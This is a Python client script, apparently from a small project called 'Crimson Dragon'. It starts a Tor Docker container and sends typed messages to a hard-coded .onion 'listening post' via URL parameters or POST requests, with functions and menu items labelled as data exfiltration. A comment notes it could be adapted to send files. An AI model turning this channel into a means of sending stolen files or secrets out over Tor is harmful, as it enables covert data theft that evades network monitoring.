import requests
import os 
import subprocess

## THIS IS THE TOR PROXY SCRIPT (Client side) ##

# CD to the directory this file is located in.
abspath = os.path.abspath(__file__)
dname = os.path.dirname(abspath)
os.chdir(dname)


# configure onion address, keep these as strings
# if we have a host file, read in that address
hs_hostname_file = "../Golden_Dragon/Docker/hidden_service/hostname"
if os.path.exists(hs_hostname_file):
    with open(hs_hostname_file) as f:
        onion_address = f.read()
        onion_address = onion_address.split('\n', 1)[0]
# if it doesn't let's hard copy one in.  YOU MUST CHANGE THIS TO MATCH YOUR OWN .onion
else:
    onion_address = "tgh4xptclkbtuynaqyjr4dqtkfad375hi2mymmiozggsavwu5c5ebrid.onion" 
tor_proxy_port = "9050"

# cd to the location of Crimson_Dragon Dockerfile/docker-compose.yml files
os.chdir(dname + "/Docker")

# proxy and url setup, shouldn't need to change these unless hosting proxy on different machine
proxies = {"http": "socks5h://localhost:"+tor_proxy_port, "https": "socks5h://localhost:"+tor_proxy_port}
url = "http://" + onion_address


def exfil_data_over_api():
    global url

    print("URL:: {}".format(url))

    # set the parameter name
    param = "secret"
    # prompt for input... this could be shifted easily to send a file but you'd need to check for max size in url (2000 char or less total to prevent issues)
    secret_message = input("What would you like to send to the listening post? ")
    # build the url and get request
    post_req = url
    myobj = {param:secret_message}
    x = requests.post(post_req, data = myobj, proxies=proxies)

    print(x.text)


def exfil_data_over_url():
    global url

    # set the parameter name
    param = "secret"
    # prompt for input... this could be shifted easily to send a file but you'd need to check for max size in url (2000 char or less total to prevent issues)
    secret_message = input("What would you like to send to the listening post? ")
    # build the url and get request
    get_req = url + "/?" + param + "=" + secret_message
    # print it to screen. Demo has the secret text embedded at the end of the html page.
    print(requests.get(get_req, proxies=proxies).text)


def run_docker():
    global dname    
    # check if our NAMED docker container exists
    result = subprocess.run(["docker", "ps", "-a"], capture_output=True, text=True)
    if "crimson_dragon" in result.stdout:
        # docker container already exists... so we just need to start it
        print("Docker container found.  Restarting...")
        start_cmd = "docker start crimson_dragon &"
        subprocess.Popen("{}".format(start_cmd), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
    else:
        # no container found, build and run it.
        print("Docker container not found.  Building and starting...")
        docker_dir = dname+"/Docker"
        build_cmd = "docker build -t crimson_dragon:latest ."
        run_cmd = "docker run -d --net=host --name crimson_dragon crimson_dragon:latest &"
        subprocess.Popen("cd {} && {} && {}".format(docker_dir, build_cmd, run_cmd), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)

def stop_docker():
    global dname
    print("Stopping Crimson Dragon")
    # start the docker container as a daemon
    subprocess.Popen("docker stop crimson_dragon", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)


def launch_tor_browser():
    # not setup for this project as I didn't use it for my project
    # but here's where you would make a call to launch the tor browser if desired
    pass


if __name__ == "__main__":
    while(True):
        print("\n\n")
        print("**** Crimson Dragon Main Menu ****")
        print("1 - Run Docker Container")
        print("2 - Stop Docker Container")
        print("3 - Exfil data via url parameter")
        print("4 - Send data via API")
        print("5 - Visit website via TOR Browser")
        print("Q - Quit program")
        menu_choice = input(">>>  ")
        
        if menu_choice.lower() == "q":
            print("Exiting program...")
            exit()
        elif menu_choice == "1":
            run_docker()        
        elif menu_choice == "2":
            stop_docker()
        elif menu_choice == "3":
            exfil_data_over_url()
        elif menu_choice == "4":
            exfil_data_over_api()
        elif menu_choice == "5":
            launch_tor_browser()
        else:
            print("Invalid Choice\n\n")
        
